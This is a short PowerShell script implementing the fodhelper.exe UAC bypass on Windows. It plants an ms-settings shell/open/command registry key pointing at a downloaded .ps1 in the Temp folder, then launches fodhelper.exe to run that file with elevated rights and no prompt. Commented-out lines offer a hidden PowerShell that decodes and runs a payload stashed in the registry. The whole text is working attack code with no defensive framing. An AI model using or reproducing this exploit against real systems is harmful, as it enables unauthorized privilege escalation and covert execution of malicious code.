
           
    #$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
      
    #$program = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x' #default
    
    $program = "C:\Users\H3X\AppData\Local\Temp\DownloadedFile.ps1";

    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 
    #Start fodhelper.exe
    Start-Process "C:\Windows\System32\fodhelper.exe" #-WindowStyle Hidden
 
    #Cleanup
    #Start-Sleep 3
    #Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 
